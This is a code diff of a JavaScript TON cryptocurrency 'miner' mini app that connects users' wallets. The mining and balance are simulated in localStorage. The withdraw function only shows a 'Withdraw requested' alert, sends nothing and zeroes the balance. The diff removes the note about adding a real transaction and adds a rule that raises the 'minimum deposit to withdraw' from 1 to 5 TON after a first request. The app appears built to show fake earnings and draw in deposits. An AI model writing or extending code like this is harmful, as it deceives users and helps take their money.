@@ -1,21 +1,26 @@
-// Підключення TonConnect
+// Ton Miner Mini App - Persistent + Boost & Withdraw Popups
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: "https://Ton_Miner.github.io/tonconnect-manifest.json"
 });
 
-// ==== Налаштування ====
+// ==== Ваш TON гаманець для виводу ====
 const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- встав свій TON адресу сюди
 
+// ==== Змінні ====
 let balance = parseFloat(localStorage.getItem("balance")) || 0;
 let mining = localStorage.getItem("mining") === "true" || false;
 let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
 let miningInterval = null;
 
-// ==== Функції ====
+// Для мінімального депозиту для withdraw
+let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;
+
+// ==== UI оновлення ====
 function updateBalanceUI() {
     document.getElementById("balance").innerText = balance.toFixed(6);
 }
 
+// ==== TonConnect ====
 async function connectWallet() {
     try {
         const wallet = await tonConnectUI.connect();
@@ -26,6 +31,7 @@ async function connectWallet() {
     }
 }
 
+// ==== Майнінг ====
 function startMining() {
     if (mining) return;
     mining = true;
@@ -38,26 +44,44 @@ function startMining() {
     }, 1000);
 }
 
-function buyBoost(amount) {
-    if (amount === 5 || amount === 15) {
-        miningSpeed += 0.000005787;
-        localStorage.setItem("miningSpeed", miningSpeed);
-        alert("Boost куплено: " + amount + " TON. Новий приріст: " + miningSpeed.toFixed(6) + " TON/sec");
-    }
+// ==== Boost ====
+function showBoost(amount) {
+    let increment = 0;
+    if (amount === 1) increment = 0.000001929;
+    else if (amount === 5) increment = 0.000005787;
+    else if (amount === 15) increment = 0.0000173611;
+
+    alert(`Boost: +${increment} TON for ${amount} TON`);
+
+    // Збільшуємо швидкість майнінгу
+    miningSpeed += increment;
+    localStorage.setItem("miningSpeed", miningSpeed);
 }
 
-function withdraw() {
-    if (balance < 1) {
-        alert("Minimum deposit to withdraw 1 TON");
+function buyBoost(amount) {
+    showBoost(amount);
+}
+
+// ==== Withdraw ====
+function showWithdraw() {
+    if (balance < minDeposit) {
+        alert(`Minimum deposit to withdraw ${minDeposit} TON`);
     } else {
         alert(`Withdraw requested: ${balance.toFixed(6)} TON to wallet ${walletAddress}`);
-        // Тут можна додати реальну транзакцію через TonConnect
+        // після успішного внесення депозита мінімум підвищується
+        minDeposit = 5;
+        localStorage.setItem("minDeposit", minDeposit);
         balance = 0; // обнуляємо баланс після заявки
         localStorage.setItem("balance", balance);
         updateBalanceUI();
     }
 }
 
+function withdraw() {
+    showWithdraw();
+}
+
+// ==== Invite ====
 function inviteFriends() {
     balance += 0.01;
     localStorage.setItem("balance", balance);
@@ -65,10 +89,15 @@ function inviteFriends() {
     alert("You invited a friend! +0.01 TON");
 }
 
+// ==== Додаємо функції до window для onclick ====
+window.connectWallet = connectWallet;
+window.startMining = startMining;
+window.buyBoost = buyBoost;
+window.withdraw = withdraw;
+window.inviteFriends = inviteFriends;
+
 // ==== DOM Ready ====
 document.addEventListener("DOMContentLoaded", () => {
     updateBalanceUI();
-
-    // Якщо майнінг вже був активний, запускаємо знову
     if (mining) startMining();
 });
